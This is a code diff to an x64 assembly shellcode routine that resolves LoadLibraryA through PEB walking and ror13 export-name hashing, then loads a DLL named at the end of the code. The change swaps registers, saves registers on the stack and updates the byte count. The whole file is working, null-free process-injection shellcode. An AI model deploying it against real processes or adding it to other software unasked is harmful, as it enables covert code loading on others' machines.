@@ -2,7 +2,7 @@
 ; shLoadLibraryA-x64.asm
 ;
 ; Shellcode that calls LoadLibraryA with the dll name appended to its end.
-;     Size:      280 bytes
+;     Size:      290 bytes
 ;     Null-free: yes
 ;
 ; Refer to https://en.wikipedia.org/wiki/Win32_Thread_Information_Block for details
@@ -24,8 +24,8 @@ public shLoadLibraryA
     ;     None. The asciiz string must be appended to the end of the code, where the code will find it under dllName.
     ;
     shLoadLibraryA proc
-        sub     rsp, 028h               ;// 40 bytes of shadow space: 32 for RCX, RDX, R8 and R9 registers, and 8 bytes.
-                                        ;// To align the stack from previous usage - the return RIP address pushed on the stack.
+        sub     rsp, 028h               ;// 40 bytes of shadow space: 32 for RCX, RDX, R8 and R9 registers, and 8 bytes to align
+                                        ;// the stack from previous usage - the return RIP address pushed on the stack.
         and     rsp, 0fffffffffffffff0h ;// Align the stack to a multiple of 16 bytes.
 
         mov     rax, rsp                ;// 1. get the pointer to accessible memory in the stack, it will be referenced in step 3 below.
@@ -35,27 +35,27 @@ public shLoadLibraryA
         pop     rax                     ;// 5. pop the value that was pushed by call.
         sub     rax, 010h               ;// 6. rax is now holding the pointer to the beginning of the shLoadLibraryA code.
 
-        mov     r15, rax                ;// Store the shLoadLibraryA base pointer in r15.
+        mov     rbx, rax                ;// Store the shLoadLibraryA base pointer in rbx.
         mov     rcx, 0 - (getKernel32Base - shLoadLibraryA)
         neg     rcx                     ;// To avoid null bytes. rcx = the relative offset of getKernel32Base symbol.
         add     rax, rcx                ;// Make the address of the getKernel32Base symbol absolute by adding the base address to it.
         call    rax                     ;// Call getKernel32Base, after the call rax = pKernel32Base.
 
-        mov     r10, r15                ;// Get the shLoadLibraryA base pointer and store it in r10.
+        mov     r8, rbx                 ;// Get the shLoadLibraryA base pointer and store it in r8.
         mov     rcx, 0 - (getProcAddressAsm - shLoadLibraryA)
         neg     rcx                     ;// To avoid null bytes. rcx = the relative offset of getProcAddressAsm symbol.
-        add     r10, rcx                ;// Make the address of the getProcAddressAsm symbol absolute by adding the base address to it.
+        add     r8, rcx                 ;// Make the address of the getProcAddressAsm symbol absolute by adding the base address to it.
         mov     rcx, rax                ;// rcx = pKernel32Base, fist argument for the getProcAddressAsm function.
         mov     rdx, 0C6042601260A288Dh ;// rdx = hash of "LoadLibraryA" string, obtained by ror13 hashing approach. Second pararmeter for getProcAddressAsm.
-        call    r10                     ;// Call getProcAddressAsm, after the call rax = pLoadLibraryA, or zero.
+        call    r8                      ;// Call getProcAddressAsm, after the call rax = pLoadLibraryA, or zero.
 
       lSplit:
-        mov     rcx, r15                ;// Get the shLoadLibraryA base pointer and store it in rcx. It will be fixed up later so, that it will point to dllName symbol.
+        mov     rcx, rbx                ;// Get the shLoadLibraryA base pointer and store it in rcx. It will be fixed up later so, that it will point to dllName symbol.
         mov     rdx, 0 - (dllName - lSplit) ;// dllMain is more than 256 bytes away from the shLoadLibraryA, and this seem to be a problem for masm64, that's why
         neg     rdx                     ;// the first shellcode's chunk size is calculated here, and stored in rdx.
-        mov     r12, 0 - (lSplit - shLoadLibraryA) ;// The second shellcode's chunk size is calculated here, and stored in r12.
-        neg     r12                     ;// r12 = The size of the second chunk of the shellcode.
-        add     rdx, r12                ;// rdx = The total size of the shellcode, from shLoadLibraryA symbol to dllName symbol.
+        mov     r9, 0 - (lSplit - shLoadLibraryA) ;// The second shellcode's chunk size is calculated here, and stored in r9.
+        neg     r9                      ;// r9 = The size of the second chunk of the shellcode.
+        add     rdx, r9                 ;// rdx = The total size of the shellcode, from shLoadLibraryA symbol to dllName symbol.
         add     rcx, rdx                ;// Make the address of the dllName symbol absolute by adding the base address to it.
         test    rax, rax                ;// Check for the value of the LoadLibraryA pointer.
         jz      lExit                   ;// If ZF is set, then exit gracefully to not crash the program. Otherwise,
@@ -101,6 +101,9 @@ public shLoadLibraryA
     ;     rdx = ror13 hash
     ;
     getProcAddressAsm proc
+        push    rbx                     ;// Store value from rbx on the stack. Not using shadow stack memory to make the shellcode shorter.
+        push    r8                      ;// Store value from r8 on the stack. Not using shadow stack memory to make the shellcode shorter.
+        push    r9                      ;// Store value from r9 on the stack. Not using shadow stack memory to make the shellcode shorter.
         movsxd  rax, dword ptr [rcx+3Ch];// Skip over the MSDOS header to the start of the PE header. rax = PIMAGE_DOS_HEADER->e_lfanew.
         xor     r11d, r11d              ;// Initialize to zero the counter of the entries in the AddressOfFunctions/AddressOfNames tables.
         mov     rsi, rdx                ;// Store the 'rotate right for 13 bits' hash of the function name in rsi.
@@ -142,6 +145,9 @@ public shLoadLibraryA
       lHashNotFound:                    ;// proceed to function's exit, setting the result to zero.
         xor     rax, rax                ;// The requested symbol was not resolved properly, return zero in this case.
       lReturn:
+        pop     r9                      ;// Restore the previous value of r9
+        pop     r8                      ;// Restore the previous value of r8
+        pop     rbx                     ;// Resotre the previous value of rbx
         ret
       lHashFound:
         mov     rax, r8                 ;// Move absolute address of the found funtion to rax register.
